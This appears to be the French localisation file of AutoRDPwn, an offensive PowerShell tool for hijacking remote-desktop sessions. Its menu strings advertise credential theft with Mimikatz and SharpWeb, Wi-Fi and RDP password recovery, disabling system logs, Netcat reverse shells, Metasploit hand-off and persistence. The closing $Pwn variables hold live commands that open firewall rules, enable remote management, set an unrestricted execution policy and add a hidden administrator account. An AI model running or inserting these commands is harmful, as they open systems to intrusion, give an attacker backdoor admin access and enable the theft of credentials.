﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")

$txt1  = "Charger des modules supplémentaires"
$txt2  = "Fermer le programme"
$txt3  = "Votre version de Powershell n'est pas compatible avec ce script :("
$txt4  = "Vous pouvez télécharger la dernière version ici"
$txt5  = "Votre système d'exploitation n'est pas compatible avec cette attaque"
$txt6  = "Option incorrecte, essayez à nouveau"
$txt7  = "Choisissez comment vous voulez lancer l'attaque:` "
$txt8  = "Choisissez le module que vous voulez charger:` "
$txt9  = "Extrait les hachages locaux avec Mimikatz"
$txt10 = "Extraire les mots de passe du système avec Mimikatz"
$txt11 = "Reconstruire le cache de l'image"
$txt12 = "Récupérer l'historique du bureau distant"
$txt13 = "$system détecté, téléchargement de Mimikatz.."
$txt14 = "Rediriger un port local"
$txt15 = "Rediriger un port distant"
$txt16 = "Consulter les redirections créées"
$txt17 = "Accès à distance"
$txt18 = "Désactiver les journaux du système"
$txt19 = "Ce processus peut prendre plusieurs minutes.."
$txt20 = "Supprimer toutes les redirections"
$txt21 = "Module chargé avec succès!"
$txt22 = "Retour au menu principal"
$txt23 = "Quelle est l'IP du serveur?:` "
$txt24 = "Et l'utilisateur?:` "
$txt25 = "Entrez le mot de passe:` "
$txt26 = "Entrez le domaine:` "
$txt27 = "Enfin, le hachage NTLM:` "
$txt28 = "Élever des privilèges avec la duplication de jetons.."
$txt29 = "Voulez-vous voir ou contrôler le périphérique?:` "
$txt30 = "Modification des autorisations pour afficher l'ordinateur distant.."
$txt31 = "Modification des autorisations pour contrôler l’ordinateur distant.."
$txt32 = "Modifications du registre Windows effectuées avec succès!"
$txt33 = "Détection de la version du système d'exploitation in` "
$txt34 = "Modifier les autorisations pour entrer sans informations d'identification.."
$txt35 = "Vous cherchez des sessions actives sur l'ordinateur.."
$txt36 = "À quelle session voulez-vous vous connecter?:` "
$txt37 = "détecté, application de modifications.."
$txt38 = "Démarrage de la connexion à distance!"
$txt39 = "Console semi-interactive (WinRS)"
$txt40 = "Une erreur s'est produite lors de la fermeture du programme.."
$txt41 = "Entrez le port local:` "
$txt42 = "Quelle interface voulez-vous utiliser?:` "
$txt43 = "Entrez le port distant:` "
$txt44 = "Enfin l'adresse IP de destination:` "
$txt45 = "Redirection créée avec succès!"
$txt46 = "Paramètres enregistrés avec succès!"
$txt47 = "Il n'y a pas de redirection à afficher"
$txt48 = "Toutes les redirections ont été supprimées"
$txt49 = "Obtenir les mots de passe des navigateurs avec SharpWeb"
$txt50 = "Mots de passe et hachages"
$txt51 = "Console Netcat (connexion directe)"
$txt52 = "Console Netcat (connexion inversée)"
$txt53 = "Entrez le port d'écoute:` "
$txt54 = "Entrez l'adresse IP distante:` "
$txt55 = "Entrez la plage IP ou réseau:` "
$txt56 = "Entrez la vitesse de numérisation (1-5):` "
$txt57 = "Entrez le nombre de ports à analyser (25-1000):` "
$txt58 = "Profil de tous les utilisateurs"
$txt59 = "Récupérer les mots de passe Wi-Fi"
$txt60 = "Il n'y a pas de réseau sans fil sur cet ordinateur"
$txt61 = "Récupérer les informations d'identification de la session RDP"
$txt62 = "Serveur VNC distant (hérité)"
$txt63 = "Collez ceci dans votre console Metasploit Framework:` "
$txt64 = "Coulisses et persistance"
$txt65 = "Entrez l'adresse IP où MSF est en cours d'exécution:` "
$txt66 = "Tout est prêt! Maintenant, lancez la commande suivante:` "
$txt67 = "Exécuter un script externe"
$txt68 = "Elévation de privilèges"
$txt69 = "Autres modules"
$txt70 = "Obtenir des informations sur le système d'exploitation"
$txt71 = "Rechercher des vulnérabilités avec Sherlock"
$txt72 = "Escalader les privilèges avec PowerUp"
$txt73 = "Entrez le chemin ou l'url du script:` "
$txt74 = "Tapez la fonction que vous voulez exécuter:` "
$txt75 = "En attente de fermeture de tous les processus.."
$txt76 = "Nettoyage terminé!"
$txt77 = "Annulation des modifications sur l'ordinateur distant.."
$txt78 = "Entrez le nom d'utilisateur:` "
$txt79 = "Changer d'utilisateur avec RunAs"
$txt80 = "Vérification des informations d'identification sur l'ordinateur local.."
$txt81 = "Identifiants incorrects! Retour au menu principal.."
$txt82 = "Chargement d'AutoRDPwn avec le nouvel utilisateur.."
$Pwn1  = "Set-NetConnectionProfile -InterfaceIndex ((Get-NetConnectionProfile).interfaceindex) -NetworkCategory Private ; winrm quickconfig -force ; Enable-PSRemoting -Force"
$Pwn2  = "netsh advfirewall firewall set rule group='Assistance à distance' new enable= Yes ; netsh advfirewall firewall set rule group='Bureau à distance' new enable= yes ; Set-ExecutionPolicy Unrestricted -Force"
$Pwn3  = "netsh advfirewall firewall set rule group='Détection du réseau' new enable =Yes ; netsh advfirewall firewall set rule group='Administration à distance des tâches planifiées' new enable= yes"
$Pwn4  = "netsh advfirewall firewall set rule group='Instrumentation de gestion Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administration à distance de Windows' new enable=yes"
$Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administrateurs AutoRDPwn /add"
$Pwn6  = "Agent de session RDP"
